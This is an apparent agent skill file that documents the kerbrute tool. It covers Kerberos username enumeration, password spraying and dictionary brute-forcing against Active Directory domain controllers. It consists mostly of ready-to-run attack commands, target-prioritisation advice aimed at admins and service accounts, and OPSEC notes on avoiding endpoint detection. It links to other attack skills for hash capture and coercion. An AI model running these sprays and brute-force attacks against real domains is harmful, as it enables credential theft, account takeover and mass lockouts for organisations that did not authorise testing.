---
name: kerbrute
description: "Enumerate valid AD usernames through Kerberos pre-authentication and spray or brute-force passwords without SMB/RDP noise. Use when you have network access to a KDC and need a validated username list before spraying. Not for offline hash cracking (use hashcat) and not for ticket extraction (use impacket GetNPUsers/GetUserSPNs)."
---

# Kerbrute

Kerbrute talks only to the KDC on UDP/TCP 88. It builds AS-REQs and reads the KDC's error code: `KDC_ERR_PREAUTH_REQUIRED` means the account exists, `KDC_ERR_C_PRINCIPAL_UNKNOWN` means it does not. That one bit is a username oracle, so the tool can turn a wordlist into a validated account list without touching SMB, LDAP or WinRM. On this box the binary is `/opt/tools/kerbrute` and reports `Version: dev (n/a) - 10/27/26`. This build names the combo command `bruteforce`, not `brute` as older guides show, and has no `--version` flag (`kerbrute version` is the subcommand).

## When to use

| Goal | Subcommand | Command shape |
| --- | --- | --- |
| Validate a username list | `userenum` | `kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt` |
| One password against many users | `passwordspray` | `kerbrute passwordspray -d corp.local --dc dc users.txt 'Spring2026!'` |
| Username as the password | `passwordspray --user-as-pass` | `kerbrute passwordspray -d corp.local --dc dc users.txt --user-as-pass` |
| Dictionary attack on one account | `bruteuser` | `kerbrute bruteuser -d corp.local --dc dc rockyou.txt jsmith` |
| Pairs from a `user:pass` file | `bruteforce` | `kerbrute bruteforce -d corp.local --dc dc pairs.txt` |
| Abort the moment a lockout appears | `--safe` | add `--safe` to any subcommand |
| Preserve results for later tooling | `-o` | `-o valid-users.txt` |

Use it before [netexec](../netexec/SKILL.md) spraying: a validated list removes the `STATUS_LOGON_FAILURE` noise from nonexistent accounts, and the KDC path leaves no SMB logon events on workstations. It does not replace roasting tools: `userenum` never returns hashes.

## Prerequisites

- Reachability to the DC on TCP/UDP 88. If DNS does not return SRV records for the domain, pass `--dc` explicitly.
- The full domain name (`-d corp.local`); the realm is the uppercased domain.
- A wordlist. `/opt/wordlists/users-top.txt` is a shortlist for the first pass; `/opt/wordlists/pass-top1m.txt` and `rockyou.txt` are for `bruteuser`.
- Lockout policy in hand before any command other than `userenum`. `nxc ldap <dc> -u <user> -p <pass> --pass-pol` gives it without guessing.
- `--delay` forces single-threading, which is the only reliable throttle in this build.

## Core invocations

```sh
# 1. Validate usernames with 10 threads against an explicit DC
kerbrute userenum -d corp.local --dc 10.10.10.10 /opt/wordlists/users-top.txt

# 2. Keep the valid list and log every attempt, including failures
kerbrute userenum -d corp.local --dc 10.10.10.10 /opt/wordlists/users-top.txt -o valid.txt -v

# 3. Slow it to one attempt per 200 ms (implies single thread)
kerbrute userenum -d corp.local --dc 10.10.10.10 /opt/wordlists/users-top.txt --delay 200

# 4. Single password against the validated list, abort on any lockout
kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid.txt 'Spring2026!' --safe

# 5. Username-as-password spray, cheap win on service accounts
kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid.txt --user-as-pass --safe -o hit.txt

# 6. Spray inside a tight lockout window: 500 ms between attempts, single thread
kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid.txt 'Corp!2026' --delay 500

# 7. Dictionary attack against one account (only with a known lockout threshold)
kerbrute bruteuser -d corp.local --dc 10.10.10.10 /opt/wordlists/pass-top1m.txt jsmith --safe

# 8. Small targeted dictionary, quiet
kerbrute bruteuser -d corp.local --dc 10.10.10.10 /opt/wordlists/pass-1050.txt svc_backup --delay 300

# 9. Combo file, one username:password per line
kerbrute bruteforce -d corp.local --dc 10.10.10.10 pairs.txt -o found.txt

# 10. Let DNS SRV discovery find the DC (needs the domain in resolv.conf)
kerbrute userenum -d corp.local /opt/wordlists/users-top.txt

# 11. Version string without touching the network
kerbrute version
```

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `--dc` | KDC address or hostname | omit only when DNS SRV works |
| `-d` | full domain, becomes the realm | required: help says `A full domain is required` |
| `-o` | write the log to a file | appended, keeps `[+]` and `[-]` lines |
| `-t` | threads, default 10 | ignored when `--delay` is set |
| `--delay` | milliseconds between attempts, single thread | the real throttle for spray windows |
| `--safe` | abort as soon as a lockout is reported | available on every subcommand |
| `-v` | log failures and errors | needed to see `KDC_ERR_*` detail |
| `--user-as-pass` | spray each username as its own password | `passwordspray` only |

## Workflow

1. **Get the lockout policy first.** `nxc ldap` `--pass-pol` is one authenticated call; guessing a 3-attempt policy with `passwordspray` locks the whole company.
2. **Enumerate.** `userenum` with `-o` and `-v`. It does not guess passwords, so it cannot lock accounts, but it does generate 4768 events per name.
3. **Deduplicate and prioritise.** Keep service accounts, admins, and names that look like humans; drop machine-style names and the `krbtgt`/`Guest` noise.
4. **Spray within the lockout budget.** One password per window, `--safe` on, delay generous. One success is enough; stop and re-scope.
5. **Escalate per account, not per list.** `bruteuser` on a single account risks that account only; keep it out of a spray.
6. **Hand off.** Valid `user:pass` goes to [netexec](../netexec/SKILL.md); hashes from roasting go to [hashcat](../hashcat/SKILL.md).

## OPSEC and telemetry

- Every `userenum` name produces a 4768 TGT request on the DC. A thousand names in ten seconds is a textbook Kerberos enumeration signature.
- `passwordspray` and `bruteuser` produce 4771 (pre-auth failed) events and increment the bad-password counter; that is what locks accounts.
- No SMB/RDP/WinRM logon is generated, so endpoint EDR on workstations sees nothing; the DC is the only witness.
- Accounts with `Do not require Kerberos preauthentication` answer with an AS-REP instead of an error, which is useful but means your `userenum` list also reveals AS-REP-roastable accounts.
- Kerberos traffic is unencrypted for the AS-REQ/AS-REP exchange, so a network sensor can see the requested principal names.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` on every name | wrong realm or wrong DC | pass `-d` as the AD DNS name and `--dc` as an IP |
| SRV lookup failure or connect timeout | no SRV records, port 88 filtered | pass `--dc <ip>`, check `nc -vz <dc> 88` |
| Fails before any attempt | realm unresolvable or misspelled | realm is the uppercase DNS name of `-d`; check with `-v` |
| All results `[-]` but the user exists | account locked or disabled | check with `nxc ldap --users`, respect `--safe` |
| Spray aborts early with a lockout message | `--safe` triggered | stop, wait out the observation window |
| Very slow with `-t 10` | `--delay` still set | remove `--delay` or accept single-thread |
| `unknown command "brute"` | this build renamed it | use `bruteforce` |
| `unknown flag: --version` | no version flag exists | `kerbrute version` |

## Verification

```sh
kerbrute version                       # Version: dev (n/a) - 10/27/26
kerbrute --help | head -12             # four subcommands plus globals
kerbrute userenum --help | head -8     # confirms <username_wordlist> positional
```

A healthy `userenum` run prints a spinner, then `[+] VALID USERNAME: jsmith@corp.local` lines and a `Done!` summary with tested and found counts. A healthy spray prints `[+] VALID LOGIN:` with the user, realm and password; absence of `[+]` with no errors means the password is simply wrong everywhere.

## Related skills

- [netexec](../netexec/SKILL.md) for lockout policy, spraying with SMB feedback and post-auth enumeration
- [responder](../responder/SKILL.md) when you would rather capture a hash than guess a password
- [hashcat](../hashcat/SKILL.md) for AS-REP and Kerberoast material
- [coercer](../coercer/SKILL.md) to turn a validated machine account into authentication
- [toolchain-router](../toolchain-router/SKILL.md) to pick a different AD tool